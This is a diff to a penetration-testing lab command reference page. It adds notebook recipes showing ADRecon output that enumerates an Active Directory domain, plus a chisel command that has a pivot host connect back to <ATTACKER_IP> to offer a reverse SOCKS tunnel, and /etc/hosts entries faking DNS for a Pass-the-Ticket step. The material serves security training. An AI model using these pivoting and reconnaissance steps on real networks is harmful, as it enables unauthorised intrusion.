@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=resolve-dnsname) · [All tools](/index)
+
 ## Commands
 
 **Windows PowerShell**
@@ -25,8 +27,77 @@ Replace DOMAIN and DC_IP with the lab domain and its DNS/DC address.
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=resolve-dnsname)
+## Notebook recipes
 
-## Learning and original examples
+3 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [DNS Enumeration and Zone Transfers](/enumeration/dns-enumeration-domain-name-system)
+<AccordionGroup>
+
+<Accordion title="Running ADRecon">
+
+### Running ADRecon
+
+**Additional AD Auditing Tools**
+
+```powershell
+PS C:\htb> .\ADRecon.ps1
+
+[*] ADRecon v1.1 by Prashant Mahajan (@prashant3535)
+[*] Running on INLANEFREIGHT.LOCAL\MS01 - Member Server
+[*] Commencing - 03/28/2022 09:24:58
+[-] Domain
+[-] Forest
+[-] Trusts
+[-] Sites
+[-] Subnets
+[-] SchemaHistory - May take some time
+[-] Default Password Policy
+[-] Fine Grained Password Policy - May need a Privileged Account
+[-] Domain Controllers
+[-] Users and SPNs - May take some time
+[-] PasswordAttributes - Experimental
+[-] Groups and Membership Changes - May take some time
+[-] Group Memberships - May take some time
+[-] OrganizationalUnits (OUs)
+[-] GPOs
+[-] gPLinks - Scope of Management (SOM)
+[-] DNS Zones and Records
+[-] Printers
+[-] Computers and SPNs - May take some time
+[-] LAPS - Needs Privileged Account
+[-] BitLocker Recovery Keys - Needs Privileged Account
+[-] GPOReport - May take some time
+[*] Total Execution Time (mins): 11.05
+[*] Output Directory: C:\Tools\ADRecon-Report-20220328092458
+```
+
+</Accordion>
+
+<Accordion title="Step 1 — Build a SOCKS tunnel through the pivot (chisel)">
+
+### Step 1 — Build a SOCKS tunnel through the pivot (chisel)
+
+**Pass the Ticket from Linux**
+
+```cmd
+:: On the PIVOT (MS01) — connect back and offer SOCKS
+c:\tools\chisel.exe client <ATTACKER_IP>:8080 R:socks
+```
+
+</Accordion>
+
+<Accordion title="Step 4 — Fake DNS with /etc/hosts">
+
+### Step 4 — Fake DNS with /etc/hosts
+
+**Pass the Ticket from Linux**
+
+```bash
+# /etc/hosts
+172.16.1.10 inlanefreight.htb inlanefreight dc01.inlanefreight.htb dc01
+172.16.1.5  ms01.inlanefreight.htb ms01
+```
+
+</Accordion>
+
+</AccordionGroup>
